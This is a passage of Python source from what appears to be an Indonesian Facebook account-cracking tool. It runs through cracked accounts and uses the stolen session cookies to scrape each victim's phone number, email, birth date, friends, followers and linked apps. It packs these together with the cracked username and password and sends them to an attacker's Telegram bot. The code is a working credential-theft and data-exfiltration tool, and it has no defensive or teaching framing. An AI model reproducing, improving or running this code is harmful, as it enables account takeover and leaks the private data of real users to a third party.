					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺
⋘─────━𓆩@x00se𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n⋘─────━𓆩@x00se<𓆪‏━─────⋙
@x00se  -  @x00se '''
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''					
   \n{infoakun}					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def O():
	exit()
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	
